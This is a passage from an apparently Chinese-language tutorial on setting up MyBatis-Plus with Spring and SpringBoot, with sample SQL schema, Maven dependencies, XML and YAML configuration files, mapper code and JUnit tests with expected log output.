的 WEB 安全组件，快速集成。 Lock4j - 基于 SpringBoot 且同时支持 RedisTemplate、Redission、Zookeeper 的分布式锁组件。 Kaptcha - 基于 SpringBoot 和 Google Kaptcha 的简单验证码组件。 MyBatis-Plus 学习路线 Spring 快速启动案例这里主要介绍 Spring 如何快速整合 MyBatis 与 MyBatis-Plus。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-01。 软件版本说明 名称 版本 Druid 1.2.11 Spring 5.3.2 Logback 1.2.3 MyBatis-Plus 3.5.2 初始化数据库123456789101112CREATE DATABASE `mybatis_plus_lesson` DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_employee(id, last_name, gender, email, age) values(1, \'Jim\',\'1\', \'jim@gmail.com\', 26), (2, \'Peter\',\'1\', \'peter@gmail.com\', 29); 引入 Maven 依赖值得注意的是，这里不需要单独引入 MyBatis 与 MyBatis-Spring 的依赖，否则会引起版本冲突，这是因为 MyBatis-Plus 会自动维护它们的版本。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;properties&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;slf4j.version&gt;1.7.30&lt;/slf4j.version&gt; &lt;logback.version&gt;1.2.3&lt;/logback.version&gt; &lt;druid.version&gt;1.2.11&lt;/druid.version&gt; &lt;mybatis-plus.version&gt;3.5.2&lt;/mybatis-plus.version&gt; &lt;mysql-connector.version&gt;8.0.23&lt;/mysql-connector.version&gt; &lt;spring.version&gt;5.3.2&lt;/spring.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;!-- Junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;${junit.version}&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Druid 连接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;${druid.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MySQL 驱动 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql-connector.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MyBatis-Plus --&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus&lt;/artifactId&gt; &lt;version&gt;${mybatis-plus.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- 日志 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;version&gt;${logback.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建项目配置文件数据库配置文件在 /src/main/resources 目录下创建 db.properties 配置文件，其中的配置内容如下： 1234567891011jdbc.user=rootjdbc.password=123456jdbc.url=jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTCjdbc.miniPoolSize=10jdbc.maxPoolSize=30jdbc.initialPoolSize=1jdbc.maxWait=60000jdbc.timeBetweenEvictionRunsMillis=60000jdbc.minEvictableIdleTimeMillis=300000jdbc.preferredTestQuery=select 1 Logback 配置文件在 /src/main/resources 目录下创建 logback.xml 配置文件，其中的配置内容如下： 1234567891011121314151617181920212223242526&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration debug="false"&gt; &lt;!-- 定义日志文件的存储地址 --&gt; &lt;property name="LOG_HOME" value="/tmp/mybatis-plus/logs" /&gt; &lt;!-- 控制台日志输出 --&gt; &lt;appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder class="ch.qos.logback.classic.encoder.PatternLayoutEncoder"&gt; &lt;!-- 格式化输出：%d 表示日期，%thread 表示线程名，%-5level：表示级别从左显示5个字符宽度，%msg：表示日志消息，%n：表示换行符 --&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- MyBatis 日志打印 --&gt; &lt;logger name="com.apache.ibatis" level="TRACE" /&gt; &lt;logger name="java.sql.Connection" level="DEBUG" /&gt; &lt;logger name="java.sql.Statement" level="DEBUG" /&gt; &lt;logger name="java.sql.PreparedStatement" level="DEBUG" /&gt; &lt;!-- 日志输出级别 --&gt; &lt;root level="DEBUG"&gt; &lt;appender-ref ref="STDOUT" /&gt; &lt;/root&gt;&lt;/configuration&gt; MyBatis 配置文件在 /src/main/resources 目录下创建 mybatis-config.xml 配置文件，用于存放 MyBatis 的全局核心配置信息，其中的配置内容如下： 12345678&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt;&lt;/configuration&gt; Spring 配置文件在 /src/main/resources 目录下创建 application.xml 配置文件，Spring 整合 MyBatis + MyBatis-Plus 的核心配置信息就写在里面（也就是定义 SqlSessionFactoryBean 的 Bean），其中的配置内容如下： MyBatis-Plus 2.x 版本配置提示 MyBatis-Plus 2.x 的 Spring 详细配置参数可看 这里。 当使用的 MyBatis-Plus 为 2.x 版本时（如 2.3.3 版本），具体的配置内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mybatis-spring="http://mybatis.org/schema/mybatis-spring" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://mybatis.org/schema/mybatis-spring http://mybatis.org/schema/mybatis-spring-1.2.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd"&gt; &lt;!-- 引入数据库配置文件 --&gt; &lt;context:property-placeholder location="classpath:db.properties" /&gt; &lt;!-- 数据源 --&gt; &lt;bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource" init-method="init" destroy-method="close"&gt; &lt;property name="url" value="${jdbc.url}" /&gt; &lt;property name="username" value="${jdbc.user}" /&gt; &lt;property name="password" value="${jdbc.password}" /&gt; &lt;property name="maxActive" value="${jdbc.maxPoolSize}" /&gt; &lt;property name="initialSize" value="${jdbc.initialPoolSize}" /&gt; &lt;property name="maxWait" value="${jdbc.maxWait}" /&gt; &lt;property name="minIdle" value="${jdbc.miniPoolSize}" /&gt; &lt;property name="timeBetweenEvictionRunsMillis" value="${jdbc.timeBetweenEvictionRunsMillis}" /&gt; &lt;property name="minEvictableIdleTimeMillis" value="${jdbc.minEvictableIdleTimeMillis}" /&gt; &lt;property name="validationQuery" value="${jdbc.preferredTestQuery}" /&gt; &lt;property name="testWhileIdle" value="true" /&gt; &lt;property name="filters" value="stat" /&gt; &lt;/bean&gt; &lt;!-- 事务管理 --&gt; &lt;bean id="dataSourceTransactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;/bean&gt; &lt;!-- 开启基于注解的事务 --&gt; &lt;tx:annotation-driven transaction-manager="dataSourceTransactionManager" /&gt; &lt;!-- 定义 SqlSessionFactory --&gt; &lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean"&gt; &lt;!-- 数据源 --&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;!-- 类型别名 --&gt; &lt;property name="typeAliasesPackage" value="com.clay.mybatis.bean" /&gt; &lt;!--指定 SQL 映射文件的位置 --&gt; &lt;property name="mapperLocations" value="classpath*:mapper/**/*.xml" /&gt; &lt;!-- 指定 MyBatis 全局配置文件的位置 --&gt; &lt;property name="configLocation" value="classpath:mybatis-config.xml" /&gt; &lt;!-- 注入 Mybatis-Plus 的全局配置 --&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- 定义 Mybatis-Plus 的全局配置 --&gt; &lt;bean id="globalConfig" class="com.baomidou.mybatisplus.entity.GlobalConfiguration"&gt; &lt;!-- 数据库表字段名与 JavaBean 属性名的驼峰命名映射，在 2.3 版本以后，默认值是 true --&gt; &lt;property name="dbColumnUnderline" value="true"&gt;&lt;/property&gt; &lt;!-- 全局的主键策略 --&gt; &lt;property name="idType" value="0"&gt;&lt;/property&gt; &lt;!-- 全局的表前缀策略配置 --&gt; &lt;property name="tablePrefix" value="t_"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- 扫描 Mapper 接口 --&gt; &lt;bean class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.clay.mybatis.dao" /&gt; &lt;/bean&gt;&lt;/beans&gt; 提示 若不希望在项目中单独创建 MyBatis 的全局配置文件，可以使用 MybatisConfiguration 定义 MyBatis 的原生配置内容，这样就不再需要创建并指定 MyBatis 的全局配置文件了，配置示例如下： 123456789101112131415&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="configuration" ref="mybatisConfig"/&gt; &lt;property name="globalConfig" ref="globalConfig"/&gt; ...&lt;/bean&gt;&lt;bean id="mybatisConfig" class="com.baomidou.mybatisplus.MybatisConfiguration"&gt; &lt;!-- 开启自动驼峰命名规则映射 --&gt; &lt;property name="mapUnderscoreToCamelCase" value="true"/&gt; ...&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.entity.GlobalConfiguration"&gt; ...&lt;/bean&gt; MyBatis-Plus 3.x 版本配置提示 MyBatis-Plus 3.x 的 Spring 详细配置参数可看 这里。 当使用的 MyBatis-Plus 为 3.5 版本时（如 3.5.2 版本），具体的配置内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mybatis-spring="http://mybatis.org/schema/mybatis-spring" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://mybatis.org/schema/mybatis-spring http://mybatis.org/schema/mybatis-spring-1.2.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd"&gt; &lt;!-- 引入数据库配置文件 --&gt; &lt;context:property-placeholder location="classpath:db.properties" /&gt; &lt;!-- 数据源 --&gt; &lt;bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource" init-method="init" destroy-method="close"&gt; &lt;property name="url" value="${jdbc.url}" /&gt; &lt;property name="username" value="${jdbc.user}" /&gt; &lt;property name="password" value="${jdbc.password}" /&gt; &lt;property name="maxActive" value="${jdbc.maxPoolSize}" /&gt; &lt;property name="initialSize" value="${jdbc.initialPoolSize}" /&gt; &lt;property name="maxWait" value="${jdbc.maxWait}" /&gt; &lt;property name="minIdle" value="${jdbc.miniPoolSize}" /&gt; &lt;property name="timeBetweenEvictionRunsMillis" value="${jdbc.timeBetweenEvictionRunsMillis}" /&gt; &lt;property name="minEvictableIdleTimeMillis" value="${jdbc.minEvictableIdleTimeMillis}" /&gt; &lt;property name="validationQuery" value="${jdbc.preferredTestQuery}" /&gt; &lt;property name="testWhileIdle" value="true" /&gt; &lt;property name="filters" value="stat" /&gt; &lt;/bean&gt; &lt;!-- 事务管理 --&gt; &lt;bean id="dataSourceTransactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;/bean&gt; &lt;!-- 开启基于注解的事务 --&gt; &lt;tx:annotation-driven transaction-manager="dataSourceTransactionManager" /&gt; &lt;!-- 定义 SqlSessionFactory --&gt; &lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;!-- 数据源 --&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;!-- 类型别名 --&gt; &lt;property name="typeAliasesPackage" value="com.clay.mybatis.bean" /&gt; &lt;!--指定 SQL 映射文件的位置 --&gt; &lt;property name="mapperLocations" value="classpath*:mapper/**/*.xml" /&gt; &lt;!-- 指定 MyBatis 全局配置文件的位置 --&gt; &lt;property name="configLocation" value="classpath:mybatis-config.xml" /&gt; &lt;!-- 注入 Mybatis-Plus 的全局配置 --&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- 定义 Mybatis-Plus 的全局配置 --&gt; &lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;property name="dbConfig" ref="dbConfig" /&gt; &lt;/bean&gt; &lt;!-- 定义 Mybatis-Plus 的数据库配置 --&gt; &lt;bean id="dbConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig.DbConfig"&gt; &lt;!-- 全局的主键策略 --&gt; &lt;property name="idType" value="AUTO"&gt;&lt;/property&gt; &lt;!-- 全局的表前缀策略配置 --&gt; &lt;property name="tablePrefix" value="t_"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- 扫描 Mapper 接口 --&gt; &lt;bean class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.clay.mybatis.dao" /&gt; &lt;/bean&gt;&lt;/beans&gt; 提示 若不希望在项目中单独创建 MyBatis 的全局配置文件，可以使用 MybatisConfiguration 定义 MyBatis 的原生配置内容，这样就不再需要创建并指定 MyBatis 的全局配置文件了，配置示例如下： 12345678910111213141516171819202122&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="configuration" ref="configuration"/&gt; &lt;property name="globalConfig" ref="globalConfig"/&gt; ...&lt;/bean&gt;&lt;bean id="configuration" class="com.baomidou.mybatisplus.core.MybatisConfiguration"&gt; &lt;!-- 开启二级缓存 --&gt; &lt;property name="cacheEnabled" value="true"&gt; &lt;!-- 开启自动驼峰命名规则映射 --&gt; &lt;property name="mapUnderscoreToCamelCase" value="true"&gt; ...&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;property name="dbConfig" ref="dbConfig"/&gt; ...&lt;/bean&gt;&lt;bean id="dbConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig.DbConfig"&gt; ...&lt;/bean&gt; 通用 CRUD 代码在项目开发中，使用 MyBatis 与 MyBatis-Plus 编写 CRUD 代码的区别： 基于 Mybatis 的方式 需要编写 Mapper 接口，并手动编写 CRUD 方法 提供 SQL 映射文件，并手动编写每个 CRUD 方法对应的 SQL 语句 基于 MyBatis-Plus 的方式 简单的 CRUD 业务只需要创建 Mapper 接口，并继承 BaseMapper 接口，这就是使用 MyBatis-Plus 所需要的操作，甚至可以不创建 SQL 映射文件 JavaBean 类1234567891011public class Employee { private Long id; private String lastName; private String gender; private String email; private Integer age; ...} Mapper 接口12345public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; { public Employee getById(Long id);} SQL 映射文件1234567891011121314&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getById" parameterType="Long" resultType="Employee"&gt; select id, last_name as lastName, gender, email, age from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; Junit 单元测试类 方式一：通过 IOC 容器测试 1234567891011121314151617181920212223242526272829public class IocContainerTest { private static final ClassPathXmlApplicationContext iocContext = new ClassPathXmlApplicationContext("application.xml"); private static final EmployeeMapper empMapper = iocContext.getBean("employeeMapper", EmployeeMapper.class); @Test public void select() { Employee employee = empMapper.selectById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); } @Test public void insert() { Employee employee = new Employee("David", "1", "david@gmail.com", 23); Integer insertResult = empMapper.insert(employee); Assert.isTrue(insertResult &gt; 0, ""); System.out.println("insert result: " + insertResult); } @Test public void getById() { Employee employee = empMapper.getById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); }} 方式二：通过 Spring + Junit 测试 123456789101112131415161718192021222324252627282930@RunWith(SpringRunner.class)@ContextConfiguration("classpath:application.xml")public class MyBatisPlusTest { @Autowired private EmployeeMapper empMapper; @Test public void select() { Employee employee = empMapper.selectById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); } @Test public void insert() { Employee employee = new Employee("David", "1", "david@gmail.com", 23); Integer insertResult = empMapper.insert(employee); Assert.isTrue(insertResult &gt; 0, ""); System.out.println("insert result: " + insertResult); } @Test public void getById() { Employee employee = empMapper.getById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); }} 执行上述的单元测试代码后，若控制台输出下面类似的日志信息，则说明 Spring 与 MyBatis-Plus 正常工作。 12345678910111213142022-09-01 21:10:50.534 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.selectById - ==&gt; Preparing: SELECT id,last_name,gender,email,age FROM t_employee WHERE id=?2022-09-01 21:10:50.535 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.selectById - ==&gt; Parameters: 1(Long)2022-09-01 21:10:50.557 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.selectById - &lt;== Total: 1Employee [id=1, lastName=David, gender=1, email=david@gmail.com, age=23]2022-09-01 21:10:50.464 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.insert - ==&gt; Preparing: INSERT INTO t_employee ( last_name, gender, email, age ) VALUES ( ?, ?, ?, ? )2022-09-01 21:10:50.510 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.insert - ==&gt; Parameters: David(String), 1(String), david@gmail.com(String), 23(Integer)2022-09-01 21:10:50.514 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.insert - &lt;== Updates: 1insert result: 12022-09-01 21:10:50.562 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.getById - ==&gt; Preparing: select id, last_name as lastName, gender, email, age from t_employee where id = ?2022-09-01 21:10:50.563 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.getById - ==&gt; Parameters: 1(Long)2022-09-01 21:10:50.564 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.getById - &lt;== Total: 1Employee [id=1, lastName=David, gender=1, email=david@gmail.com, age=23] SpringBoot 快速启动案例这里主要介绍 SpringBoot 如何快速整合 MyBatis 与 MyBatis-Plus，本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-02。 软件版本说明 名称 版本 Druid 1.2.11 SpringBoot 2.7.3 MyBatis-Plus 3.5.2 初始化数据库123456789101112CREATE DATABASE `mybatis_plus_lesson` DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_employee(id, last_name, gender, email, age) values(1, \'Jim\',\'1\', \'jim@gmail.com\', 26), (2, \'Peter\',\'1\', \'peter@gmail.com\', 29); 引入 Maven 依赖值得注意的是，这里不需要单独引入 MyBatis 与 MyBatis-Spring 的依赖，否则会引起版本冲突，这是因为 MyBatis-Plus 会自动维护它们的版本。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;properties&gt; &lt;druid.version&gt;1.2.11&lt;/druid.version&gt; &lt;mybatis-plus.version&gt;3.5.2&lt;/mybatis-plus.version&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.7.3&lt;/version&gt; &lt;relativePath /&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!-- Junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- SpringBoot --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- MySQL 驱动 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Druid 连接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${druid.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MyBatis-Plus --&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;${mybatis-plus.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; SpringBoot 配置文件提示 SpringBoot 2.0（内置 jdbc5 驱动），驱动类使用的是 driver-class-name: com.mysql.jdbc.Driver SpringBoot 2.1 及以上（内置 jdbc8 驱动），驱动类使用的是 driver-class-name: com.mysql.cj.jdbc.Driver MySQL 5.7 版本的 URL 为 jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf-8&amp;useSSL=false MySQL 8.0 版本的 URL 为 jdbc:mysql://127.0.0.1:3306/mybatis_plus?serverTimezone=GMT%2B8&amp;characterEncoding=utf-8&amp;useSSL=false，若不指定 serverTimezone=GMT%2B8 会导致连接 MySQL 时抛出异常 MyBatis-Plus 2.x 版本配置提示 MyBatis-Plus 2.x 的 SpringBoot 详细配置参数可看 这里。 当使用的 MyBatis-Plus 为 2.x 版本时（如 2.3.3 版本），具体的配置内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354spring: # Druid 数据源配置 datasource: type: com.alibaba.druid.pool.DruidDataSource druid: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC username: root password: 123456 initial-size: 10 max-active: 100 min-idle: 10 max-wait: 60000 pool-prepared-statements: true max-pool-prepared-statement-per-connection-size: 20 time-between-eviction-runs-millis: 60000 min-evictable-idle-time-millis: 300000 validation-query: SELECT 1 test-while-idle: true test-on-borrow: false test-on-return: false stat-view-servlet: enabled: false url-pattern: /druid/* login-username: admin login-password: 123456 filter: stat: log-slow-sql: true slow-sql-millis: 1000 merge-sql: false wall: config: multi-statement-allow: true# MyBatis-Plus 配置mybatis-plus: mapper-locations: classpath*:/mapper/**/*.xml type-aliases-package: com.clay.mybatis.bean # MyBatis-Plus 全局配置 global-config: id-type: 0 field-strategy: 2 db-column-underline: true table-prefix: t_ # MyBatis 原生配置 configuration: jdbc-type-for-null: \'null\' map-underscore-to-camel-case: true log-impl: org.apache.ibatis.logging.stdout.StdOutImpllogging: level: com.clay.mybatis.dao: debug 若项目中有全局的 MyBatis 配置文件（XML），可以将其路径配置到 MyBatis-Plus 的 confifigLocation 中，如下所示： 123mybatis-plus: config-location: classpath:mybatis-config.xml ... MyBatis-Plus 3.x 版本配置提示 MyBatis-Plus 3.x 的 SpringBoot 详细配置参数可看 这里。 当使用的 MyBatis-Plus 为 3.5 版本时（如 3.5.2 版本），具体的配置内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455spring: # Druid 数据源配置 datasource: type: com.alibaba.druid.pool.DruidDataSource druid: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC username: root password: 123456 initial-size: 10 max-active: 100 min-idle: 10 max-wait: 60000 pool-prepared-statements: true max-pool-prepared-statement-per-connection-size: 20 time-between-eviction-runs-millis: 60000 min-evictable-idle-time-millis: 300000 validation-query: SELECT 1 test-while-idle: true test-on-borrow: false test-on-return: false stat-view-servlet: enabled: false url-pattern: /druid/* login-username: admin login-password: 123456 filter: stat: log-slow-sql: true slow-sql-millis: 1000 merge-sql: false wall: config: multi-statement-allow: true# MyBatis-Plus 配置mybatis-plus: mapper-locations: classpath*:/mapper/**/*.xml type-aliases-package: com.clay.mybatis.bean # MyBatis-Plus 全局配置 global-config: banner: false db-config: id-type: AUTO table-prefix: t_ table-underline: true # MyBatis 原生配置 configuration: jdbc-type-for-null: \'null\' map-underscore-to-camel-case: true log-impl: org.apache.ibatis.logging.stdout.StdOutImpllogging: level: com.clay.mybatis.dao: debug 若项目中有全局的 MyBatis 配置文件（XML），可以将其路径配置到 MyBatis-Plus 的 confifigLocation 中，如下所示： 123mybatis-plus: config-location: classpath:mybatis-config.xml ... 通用 CRUD 代码在项目开发中，使用 MyBatis 与 MyBatis-Plus 编写 CRUD 代码的区别： 基于 Mybatis 的方式 需要编写 Mapper 接口，并手动编写 CRUD 方法 提供 SQL 映射文件，并手动编写每个 CRUD 方法对应的 SQL 语句 基于 MyBatis-Plus 的方式 简单的 CRUD 业务只需要创建 Mapper 接口，并继承 BaseMapper 接口，这就是使用 MyBatis-Plus 所需要的操作，甚至可以不创建 SQL 映射文件 JavaBean 类1234567891011public class Employee { private Long id; private String lastName; private String gender; private String email; private Integer age; ...} Mapper 接口12345public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; { public Employee getById(Long id);} SQL 映射文件1234567891011121314&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getById" parameterType="Long" resultType="Employee"&gt; select id, last_name as lastName, gender, email, age from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; SpringBoot 启动类通过 @MapperScan 注解来扫描 Mapper 接口。 123456789@SpringBootApplication@MapperScan("com.clay.mybatis.dao")public class MyBatisPlusApplication { public static void main(String[] args) { SpringApplication.run(MyBatisPlusApplication.class, args); }} Junit 单元测试类1234567891011121314151617181920212223242526272829@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private EmployeeMapper empMapper; @Test public void select() { Employee employee = empMapper.selectById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); } @Test public void insert() { Employee employee = new Employee("David", "1", "david@gmail.com", 23); Integer insertResult = empMapper.insert(employee); Assert.isTrue(insertResult &gt; 0, ""); System.out.println("insert result: " + insertResult); } @Test public void getById() { Employee employee = empMapper.getById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); }} 执行上述的单元测试代码后，若控制台输出下面类似的日志信息，则说明 SpringBoot 与 MyBatis-Plus 正常工作。 123456789101112131415161718==&gt; 